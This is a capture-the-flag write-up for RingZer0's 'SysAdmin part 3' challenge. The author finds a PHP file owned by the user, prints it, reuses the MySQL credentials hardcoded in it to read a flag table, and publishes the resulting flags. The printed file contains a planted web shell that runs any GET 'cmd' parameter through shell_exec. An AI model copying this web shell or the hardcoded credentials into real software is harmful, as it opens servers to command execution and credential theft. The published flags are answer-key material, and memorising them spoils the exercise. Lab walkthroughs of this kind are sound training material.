# SysAdmin part 3

__PROBLEM__

Dig for flag.

User: architect
Password: architect password found in previous challenge

ssh architect@challenges.ringzer0team.com -p 10152

__SOLUTION__

password is : `FLAG-232f99b4178bdc7fef7eb1f0f78831f9`

As in the problem we have to dig for the flag. Best way to start is with `find`
```bash
find / -user architect
```
This will give you lot of output along with lot's of permission denied and proc so a good way to clean output is:

```bash
architect@lxc-sysadmin:~$ find / -user architect 2>&1 | egrep -v "Permission denied|proc"
/var/www/index.php
/home/architect
/home/architect/.bashrc
/home/architect/.bash_logout
/home/architect/.profile
/dev/pts/5
```

For obvious reason we ignore all the `/home/`. So start with `/var/www/index.php`.

```bash
architect@lxc-sysadmin:~$ cat /var/www/index.php
<?php
if(isset($_GET['cmd'])) {
  $res = shell_exec(urldecode($_GET['cmd']));
  print_r(str_replace("\n", '<br />', $res));
  exit();
}
$info = (object)array();
$info->username = "arch";
$info->password = "asdftgTst5sdf6309sdsdff9lsdftz";
$id = 1003;

function GetList($id, $info) {
        $id = 2;
        $link = mysql_connect("127.0.0.1", $info->username, $info->password);
        mysql_select_db("arch", $link);
        $result = mysql_query("SELECT * FROM arch");
        $output = array();
        while($row = mysql_fetch_assoc($result)) {
                array_push($output, $row);
        }
        var_dump($output);
        return $output;
}

$output = shell_exec('id');
echo "<pre>$output</pre>";

?>
<?php
//ENTER THE RELEVANT INFO BELOW
$mysqlDatabaseName ="arch";
$mysqlUserName ="arch";
$mysqlPassword ="asdftgTst5sdf6309sdsdff9lsdftz";
$mysqlHostName ="127.0.0.1";
$mysqlExportPath ="/var/tmp/ar.sql";

//DO NOT EDIT BELOW THIS LINE
//Export the database and output the status to the page
$command='mysqldump --opt -h' .$mysqlHostName .' -u' .$mysqlUserName .' -p' .$mysqlPassword .' ' .$mysqlDatabaseName .' > ' .$mysqlExportPath;
exec($command,$output=array(),$worked);
switch($worked){
case 0:
echo 'Database <b>' .$mysqlDatabaseName .'</b> successfully exported to <b>~/' .$mysqlExportPath .'</b>';
break;
case 1:
echo 'There was a warning during the export of <b>' .$mysqlDatabaseName .'</b> to <b>~/' .$mysqlExportPath .'</b>';
break;
case 2:
echo 'There was an error during export. Please check your values:<br/><br/><table><tr><td>MySQL Database Name:</td><td><b>' .$mysqlDatabaseName .'</b></td></tr><tr><td>MySQL User Name:</td><td><b>' .$mysqlUserName .'</b></td></tr><tr><td>MySQL Password:</td><td><b>NOTSHOWN</b></td></tr><tr><td>MySQL Host Name:</td><td><b>' .$mysqlHostName .'</b></td></tr></table>';
break;
}
?>



<!DOCTYPE html>
<html>
        <head>
                <title>Architect list query</title>
        </head>
        <body>
                <form action="" method="GET">
                        <input type="text" name="id" />
                        <input type="submit" value="search">
                </form>
                <?php foreach(GetList(1003, $info) as $item):
                        echo $item["id"] . ":" . $item["arch"] . "<br />\r\n";
                endforeach; ?>
        </body>
</html>
```

From above output we see it is some kind of `mysql` username and password so let's get into `mysql`.

```bash
architect@lxc-sysadmin:~$ mysql -u arch -p
Enter password: `asdftgTst5sdf6309sdsdff9lsdftz`
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 1241
Server version: 5.7.22-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| arch               |
+--------------------+
2 rows in set (0.00 sec)

mysql> use arch;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+----------------+
| Tables_in_arch |
+----------------+
| arch           |
| flag           |
+----------------+
2 rows in set (0.00 sec)

mysql> select * from flag;
+---------------------------------------+
| flag                                  |
+---------------------------------------+
| FLAG-55548fdb24a6ef248d8fdfde2720f6bd |
+---------------------------------------+
1 row in set (0.00 sec)
```

FLAG - `FLAG-55548fdb24a6ef248d8fdfde2720f6bd`
